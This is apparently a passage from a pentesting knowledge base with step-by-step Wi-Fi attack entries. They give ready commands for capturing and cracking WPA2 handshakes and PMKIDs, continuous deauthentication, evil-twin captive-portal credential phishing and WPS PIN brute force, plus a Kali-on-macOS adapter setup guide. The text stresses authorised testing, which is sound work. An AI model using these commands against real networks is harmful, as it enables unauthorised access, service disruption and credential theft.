- **WPS** — brute the WPS PIN (reaver/bully) on vulnerable APs.
- **WPA3** — SAE resists offline cracking; focus shifts to transition-mode downgrade, Dragonblood
  side-channels, and evil-twin/social paths. Open/WEP networks are trivially broken (legacy).

## Scope & law
Only test networks you own or are explicitly authorised to. Capturing/deauthing other people's
Wi-Fi is illegal in most places.

## Pattern
"Monitor mode + injection -> capture a crackable secret (handshake/PMKID) or stand up a rogue AP
-> crack/relay offline." Enumerate (airodump), capture (airodump/hcxdumptool), then crack
(hashcat/aircrack). Tools: see atlas airodump-ng/aircrack-ng/wifite/hcxdumptool.

entries.title: Capturing & cracking WPA2 (handshake / PMKID)
entries.brief: The two ways to get a crackable WPA2 secret and break it offline
entries.body:
## Route A: the 4-way handshake
WPA2-PSK proves knowledge of the passphrase in a 4-way handshake at connect time. Capture it,
then crack the passphrase offline.
    sudo airmon-ng start wlan0
    sudo airodump-ng wlan0mon                               # find target BSSID + channel
    sudo airodump-ng -c <ch> --bssid <BSSID> -w cap wlan0mon   # capture on that channel
    # in another terminal, force a client to reconnect:
    sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT> wlan0mon
    # 'WPA handshake: <BSSID>' appears in airodump -> you have it in cap-01.cap

## Route B: PMKID (often no client needed)
Many APs leak a PMKID you can grab directly — faster, no deauth, no connected client required.
    sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
    hcxpcapngtool -o hash.hc22000 pmkid.pcapng             # convert to hashcat format

## Crack it (offline)
    # handshake -> hashcat 22000 (convert .cap first with hcxpcapngtool, or use aircrack):
    aircrack-ng cap-01.cap -w /usr/share/wordlists/rockyou.txt
    hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule

## Pattern
"Get a crackable WPA2 secret (handshake via deauth, or PMKID directly), convert to hc22000, crack
with a good wordlist+rules." Cracking success is all about the wordlist (wordlists-and-rules).
WPA3-SAE doesn't yield to this offline route.

entries.title: Deauth, evil twin, WPS — the active attacks
entries.brief: Beyond cracking: knocking clients off, rogue APs, and WPS brute force
entries.body:
## Deauthentication
802.11 management frames are unauthenticated, so you can forge **deauth** frames to kick clients
off an AP — used to force a handshake, or (noisily) to disrupt.
    sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon        # 0 = continuous (DoS-like; use sparingly)
Modern 802.11w (PMF) protects management frames and blocks this.

## Evil twin / rogue AP
Stand up a fake AP with the **same ESSID**, stronger signal; clients auto-associate. Pair with a
**captive portal** to phish the Wi-Fi/webapp password, or to MITM traffic.
    # frameworks: wifiphisher (automated captive-portal phishing), hostapd-wpe (enterprise creds),
    # eaphammer (WPA-Enterprise / PEAP relay).
For **WPA-Enterprise**, hostapd-wpe/eaphammer capture the client's MSCHAPv2 challenge/response ->
crack offline (asleap/hashcat).

## WPS PIN brute force
APs with WPS on (and no lockout) leak the PSK via an 8-digit PIN:
    sudo reaver -i wlan0mon -b <BSSID> -vv                  # online PIN brute (slow)
    # Pixie-Dust (offline) is far faster where supported:
    sudo reaver -i wlan0mon -b <BSSID> -K 1 -vv

## Pattern
"Force a handshake (deauth), impersonate the network (evil twin + portal) to steal creds, or
brute WPS where it's enabled." Match the attack to the target's config: PMF blocks deauth, WPS-off
blocks reaver, so recon (airodump/wash) first. Authorised targets only.

entries.title: Kali + VMware Fusion on macOS for Wi-Fi testing
entries.brief: MacBook USB-C, a USB-A Alfa via a data adapter, passed through to Kali
entries.body:
## The crucial point
A MacBook cannot do Wi-Fi monitor mode. The internal card cannot be passed into the VM, and
VMware's Network Adapter menu (NAT / Bridged / Host-only) is only the VM's **virtual wired NIC**.
The working path is an external USB adapter, handed to Kali from the USB menu.

## The practical chain
Current MacBooks have **USB-C only**. The Alfa sticks below are **USB-A**. The chain is:
    MacBook USB-C -> USB-C-to-A data adapter or hub -> Alfa -> Fusion USB menu -> Kali
The C-to-A piece must carry **data**. A charge-only cable enumerates nothing. Plug it in and
confirm the Mac lists it (`system_profiler SPUSBDataType`, or the Fusion USB menu) before you
hand it to the VM. Leave the virtual NIC on **NAT** so Kali still has internet.

## Adapters that work this way
In-kernel MediaTek is the buy. The stick is USB-A, so every one of these needs that data adapter.
| Stick | lsusb shows | Bands | In Kali |
| --- | --- | --- | --- |
| AWUS036ACM | MediaTek MT7612U | 2.4 and 5 | plug in (mt76) |
| AWUS036AXML | MediaTek MT7921 | 2.4, 5, and 6 | plug in (kernel 5.18+) |
| AWUS036NHA | Atheros AR9271 | 2.4 only | plug in (ath9k_htc) |
| AWUS036ACH | Realtek RTL8812AU | 2.4 and 5 | 8812au DKMS module |
**AWUS036ACM** is the practical default: dual-band, in-kernel on Intel and Apple-Silicon Kali.
**AWUS036AXML** is the other plug-in choice, including Wi-Fi 6E, with no driver build.
**AWUS036NHA** is the 2.4 GHz lab stick.
**AWUS036ACH** works after an out-of-tree driver build, so skip it unless you already own one.

## Which Kali image
**Apple Silicon** (M1 and later) needs the Kali **ARM64** image. An x86_64 ISO does not boot.
**Intel** Macs use the normal Kali **x86_64** ISO. USB passthrough itself is the same on both.
